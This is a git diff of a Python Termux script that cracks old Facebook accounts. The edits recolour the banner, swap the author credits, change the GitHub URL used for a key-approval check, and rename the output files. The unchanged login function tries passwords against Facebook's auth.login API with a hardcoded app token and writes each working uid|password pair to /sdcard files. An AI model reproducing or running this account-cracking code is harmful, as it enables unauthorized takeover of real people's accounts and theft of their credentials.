@@ -49,19 +49,21 @@ logo = (f"""
  
                                                            
                                                            
-\033[1;90m        /$$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$      
-| $$__  $$ /$$__  $$| $$  | $$| $$  | $$| $$      
-| $$  \ $$| $$  \ $$| $$  | $$| $$  | $$| $$      
-| $$$$$$$/| $$$$$$$$| $$$$$$$$| $$  | $$| $$      
-| $$__  $$| $$__  $$| $$__  $$| $$  | $$| $$      
-| $$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$      
+\033[1;91m[1;90m\033[1;90m        /$$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$      
+ \033[1;92m| $$__  $$ /$$__  $$| $$  | $$| $$  | $$| $$      
+\033[0;93m| $$  \ $$| $$  \ $$| $$  | $$| $$  | $$| $$      
+\033[0;95m| $$$$$$$/| $$$$$$$$| $$$$$$$$| $$  | $$| $$      
+\033[0;97m| $$__  $$| $$__  $$| $$__  $$| $$  | $$| $$      
+\033[0;92m| $$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$      
 | $$  | $$| $$  | $$| $$  | $$|  $$$$$$/| $$$$$$$$
-|__/  |__/|__/  |__/|__/  |__/ \______/ |________/
-"""
+\033[0;99m|__/  |__/|__/  |__/|__/  |__/ \______/ |________/                      
+\033[0;99m                            
+                    
+   
                                                                                                                    
 \x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
-\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92  RAHUL
-[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mRAHUL TIWARI
+\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92  AYUSH 
+[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mAYUSH PANDIT
 [\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mOLD ID
 [\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92m𝙵𝚁𝙴𝙴 
 [\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32m𝚅1\033[1;35m]
@@ -120,13 +122,13 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
             if "session_key" in rp:
-                print(f"\r\r{G}RAHUL😊OK {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/RAHUL-OLD-OK","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r{G}R9HUL-NAYRA😊OK {A}➤ {G}{uid} {A}•{G} {pw}")
+                open("/sdcard/SOURAV-OLD-OK","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r{G}AYUSH😊OK {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/VISHAL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r{G}R9HUL-NAYRA😊OK {A}➤ {G}{uid} {A}•{G} {pw}")
+                open("/sdcard/RAHUL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in str(rp):
@@ -142,7 +144,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/prema577/Approval/blob/main/approval.txt").text
+	r1=requests.get("https://github.com/Mrchandu7/trick/blob/main/trick.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
